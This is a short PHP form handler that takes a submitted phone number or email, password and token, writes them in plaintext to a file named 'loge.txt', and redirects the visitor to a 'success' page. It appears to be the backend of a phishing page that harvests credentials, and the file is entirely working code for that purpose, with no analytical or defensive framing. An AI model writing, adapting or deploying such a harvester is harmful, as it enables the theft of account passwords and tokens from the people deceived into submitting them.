<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get data from the form
    $phone = isset($_POST["phone"]) ? $_POST["phone"] : "";
    $password = isset($_POST["password"]) ? $_POST["password"] : "";
    $token = isset($_POST["token"]) ? $_POST["token"] : "";

    // Create log entry with timestamp
    $timestamp = date("Y-m-d H:i:s");
    $log_entry = "[$timestamp] Phone/Email: " . $phone . " | Password: " . $password . " | Token: " . $token . "\n";

    // Append to loge.txt
    file_put_contents("loge.txt", $log_entry, FILE_APPEND);

    // Redirect back to the main page or a success page
    header("Location: index.html?status=success");
    exit();
} else {
    // If accessed directly, redirect to the main page
    header("Location: index.html");
    exit();
}
?>
